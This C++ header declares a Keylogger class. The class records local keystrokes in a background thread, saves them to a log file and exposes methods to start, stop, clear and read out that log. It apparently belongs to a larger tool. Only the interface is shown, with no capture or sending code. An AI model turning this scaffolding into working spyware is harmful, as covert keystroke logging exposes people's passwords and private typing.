#pragma once

#include <string>
#include <vector>
#include <memory>

#include "methods/keylogger/IKeyloggerImplementation.h"


namespace methods
{
namespace keylogger
{
/**
  * Class records keystrokes of the local machine.
  * It starts and stops a background thread and
  * saves keystrokes to a log file.
  *
  * Can only run 1 thread at a time.
  */
class Keylogger
{
public:
    Keylogger(IKeyloggerImplementation *implementation)
        : m_threadRunning(false),
          m_implementation(std::unique_ptr<IKeyloggerImplementation>(implementation))
    {}
    virtual ~Keylogger();

    // Copy is forbidden
    Keylogger(const Keylogger& other)            = delete;
    Keylogger& operator=(const Keylogger& other) = delete;

    Keylogger(Keylogger&& other)                 = default;
    Keylogger& operator=(Keylogger&& other) 	 = default;

    /**
      * This functions starts the logging thread.
      */
    void StartThread() noexcept;

    /**
      * This functions stops the logging thread.
      */
    void StopThread() noexcept;

    /**
      * This functions clears the log file.
      */
    void ClearLog() noexcept;

    /**
      * Use this function to get the log file's size
      * in bytes.
      * @return size of log file in bytes
      */
    uint32_t LogSize() noexcept;

    /**
      * Use this function to get the log file's content.
      * @param[in,out] buffer - a buffer to save the content to.
      * @param[in] buffer_len - the size of buffer.
      * @return number of bytes copied to buffer.
      */
    uint32_t GetLog(char *buffer,
                    uint32_t buffer_len)
     noexcept;

protected:

    /**
      * Should thread be running at the moment.
      */
    bool m_threadRunning;

    /**
      * The thread marks its entering and exit using this
      * boolean. You know that a thread has finished its
      * process once this boolean is true.
      */
    bool m_threadOut;

private:

    std::unique_ptr<IKeyloggerImplementation> m_implementation;

    /**
      * This function logs keystrokes while m_threadRunning
      * is true and is the described thread.
      * It sets m_threadOut true on entering,
      * and sets its value false on exit.
      */
    void KeylogThread() noexcept;

};
}
}
